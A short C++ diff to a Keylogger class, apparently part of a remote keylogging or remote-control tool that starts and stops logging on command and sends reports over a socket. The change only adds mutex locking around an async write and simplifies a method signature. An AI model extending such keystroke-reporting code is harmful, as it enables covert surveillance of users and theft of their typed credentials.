@@ -63,6 +63,7 @@ namespace http
 			_reply_buffer_ptr->headers[2].name = "Content-Length";
 			_reply_buffer_ptr->headers[2].value = std::to_string(_reply_buffer_ptr->content.size());
 
+			async_write_mutex.lock();
 			async_write(socket_,
 				_reply_buffer_ptr->to_buffers(),
 				boost::bind(&Keylogger::handle_async_write_report,
@@ -74,6 +75,7 @@ namespace http
 
 		void Keylogger::handle_async_write_report(const boost::system::error_code& error, std::size_t bytes)
 		{
+			async_write_mutex.unlock();
 			if( error != error::operation_aborted)
 			{
 				if(isStarted)
@@ -85,7 +87,7 @@ namespace http
 			}
 		}
 
-		bool Keylogger::execute(std::shared_ptr<request> req, std::shared_ptr<reply> rep)
+		bool Keylogger::execute(std::shared_ptr<request> req)
 		{
 			if (req->action_type.compare(wxhtpconstants::ACTION_TYPE::KEYLOGGER_START)
 				&& req->action_type.compare(wxhtpconstants::ACTION_TYPE::KEYLOGGER_STOP))
